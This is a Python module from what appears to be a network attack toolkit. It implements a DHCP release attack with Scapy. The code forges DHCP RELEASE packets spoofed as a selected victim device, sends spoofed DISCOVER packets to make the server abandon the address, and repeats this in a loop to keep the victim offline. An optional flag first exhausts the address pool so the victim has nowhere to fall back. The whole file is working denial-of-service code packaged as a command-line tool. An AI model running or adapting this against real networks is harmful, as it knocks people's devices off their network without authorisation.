import time
import threading
from attacks.base import BaseAttack
from recon.network_scan import scan_subnet
from recon.target_selector import select_device
from recon.dhcp_discover import find_dhcp_server
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, mac2str
from common.packet_utils import random_mac, random_xid
from attacks.starvation import StarvationAttack

class ReleaseAttack(BaseAttack):
    """
    DHCP Release Attack.
    Sends DHCP RELEASE messages to the server, releasing leases for specified IPs.
    """

    def __init__(self, iface, logger=None, mantain_interval=30, maintain_count=None, mantain_timeout=None, drain_pool=False):
        super().__init__(iface, logger)
        self.target_ip = None
        self.target_mac = None
        self.server_ip = None
        self.server_mac = None
        self.maintain_interval = mantain_interval
        self.maintain_count = maintain_count
        self.maintain_timeout = mantain_timeout
        self.drain_pool = drain_pool

    def send_dhcp_release(self, iface: str, client_ip: str, client_mac: str, server_ip: str, server_mac: str):
        pkt = (
            Ether(src=client_mac, dst=server_mac)
            / IP(src=client_ip, dst=server_ip)
            / UDP(sport=68, dport=67)
            / BOOTP(
                op=1,
                ciaddr=client_ip,
                chaddr=mac2str(client_mac),
            )
            / DHCP(
                options=[
                    ("message-type", "release"),
                    ("server_id", server_ip),
                    "end",
                ]
            )
        )

        sendp(pkt, iface=iface, verbose=False)
        self.logger.info("DHCP RELEASE sent for IP=%s (client MAC=%s, server=%s)", client_ip, client_mac, server_ip)

    def send_dhcp_discover(self, iface: str, client_ip: str):
        client_mac = random_mac()
        pkt = (
            Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")
            / IP(src="0.0.0.0", dst="255.255.255.255")
            / UDP(sport=68, dport=67)
            / BOOTP(
                op=1,
                htype=1,
                hlen=6,
                xid=random_xid(),
                chaddr=mac2str(client_mac).ljust(16, b"\x00"),
                ciaddr="0.0.0.0",
                flags=0x8000,
            )
            / DHCP(
                options=[
                    ("message-type", "discover"),
                    ("requested_addr", client_ip),
                    ("param_req_list", [1, 3, 6, 28, 51, 54, 58, 59]),
                    "end",
                ]
            ))

        sendp(pkt, iface=iface, verbose=False)
        self.logger.info("DHCP DISCOVER sent (spoofed MAC=%s) targeting IP=%s — triggers server ping-check/abandon", client_mac, client_ip)

    def maintain_target_lease(self):
        while (self.maintain_count is None or self.maintain_count > 0) and (self.maintain_timeout is None or self.maintain_timeout > 0) and not self.stopped:
            self.logger.info("Maintaining lease for IP: %s", self.target_ip)

            self.logger.debug("continuing to maintain lease for %s seconds", self.maintain_interval)
            if self.maintain_count is not None:
                self.maintain_count -= 1
            self.logger.debug("remaining maintain count: %s", self.maintain_count)
            if self.maintain_timeout is not None:
                self.maintain_timeout -= self.maintain_interval

            self.logger.info("Scanning subnet to find target's current IP for MAC: %s", self.target_mac)
            devices = scan_subnet(self.iface)
            self.logger.debug("Scan results: %s", devices)

            self.logger.debug("Looking for target MAC %s in scan results", self.target_mac)
            self.target_ip = next((d["ip"] for d in devices if d["mac"] == self.target_mac), None)
            self.logger.debug("Found target IP: %s for MAC: %s", self.target_ip, self.target_mac)

            if not self.target_ip:
                self.logger.warning("Target MAC %s not found in scan results (likely hasn't re-acquired an IP yet). Skipping this cycle.", self.target_mac)
                time.sleep(self.maintain_interval)
                continue


            self.send_dhcp_release(
                iface=self.iface,
                client_ip=self.target_ip,
                client_mac=self.target_mac,
                server_ip=self.server_ip,
                server_mac=self.server_mac,
            )
            self.send_dhcp_discover(iface=self.iface, client_ip=self.target_ip)

            time.sleep(self.maintain_interval)

        

    def run(self):
        try:
            if self.drain_pool:
                self.logger.info("Starting pool drain (StarvationAttack) in the background...")
                self.pool_drain = StarvationAttack(iface=self.iface, maintain=True, exhaustion_timeout=5.0)
                threading.Thread(target=self.pool_drain.run, daemon=True).start()
                # Land-grab runs until no OFFER arrives for exhaustion_timeout seconds —
                # wait for it to actually finish before releasing the target, otherwise
                # the target's freed IP could just get re-offered to the real victim
                # from an otherwise-still-open pool.
                while not self.pool_drain._land_grab_done and not self.stopped:
                    time.sleep(0.5)
                self.logger.info("Pool drain land-grab finished — proceeding to release target.")

            self.logger.info("Discovering DHCP server on interface %s...", self.iface)
            device_info = find_dhcp_server(self.iface)
            self.server_ip, self.server_mac = device_info["ip"], device_info["mac"]
            self.logger.info("DHCP server found: IP=%s MAC=%s", self.server_ip, self.server_mac)

            self.logger.info("Scanning subnet for devices...")
            devices = scan_subnet(self.iface)

            self.logger.info("Selecting target device to release lease from...")
            selection = select_device(devices, server_ip=self.server_ip)
            self.logger.info("Selected target device: IP=%s MAC=%s", selection["target_ip"], selection["target_mac"])

            self.target_ip, self.target_mac = selection["target_ip"], selection["target_mac"]
            self.send_dhcp_release(
                iface=self.iface,
                client_ip=self.target_ip,
                client_mac=self.target_mac,
                server_ip=self.server_ip,
                server_mac=self.server_mac,
            )
            self.send_dhcp_discover(iface=self.iface, client_ip=self.target_ip)

            manage_thread = threading.Thread(target=self.maintain_target_lease, daemon=True)
            manage_thread.start()
            manage_thread.join()

        except RuntimeError as e:
            self.logger.error(str(e))
            return

    @classmethod
    def configure_parser(cls, parser):
        parser.add_argument("--maintain-interval", type=int, default=30,
                            help="Interval in seconds to maintain the lease (default: 30)")
        parser.add_argument("--maintain-count", type=int, default=None,
                            help="Number of times to maintain the lease (default: unlimited)")
        parser.add_argument("--maintain-timeout", type=int, default=None,
                            help="Total time in seconds to maintain the lease (default: unlimited)")
        parser.add_argument("--drain-pool", action="store_true",
                            help="Also run a StarvationAttack in the background to claim/hold the rest "
                                 "of the pool, and wait for it to finish its land-grab before releasing "
                                 "the target (so the victim has nowhere else to fall back to).")

    @classmethod
    def from_args(cls, args):
        if args.maintain_timeout is not None and args.maintain_timeout <= args.maintain_interval:
            raise ValueError("maintain_timeout must be greater than maintain_interval")
        return cls(
            iface=args.iface,
            mantain_interval=args.maintain_interval,
            maintain_count=args.maintain_count,
            mantain_timeout=args.maintain_timeout,
            drain_pool=args.drain_pool,
        )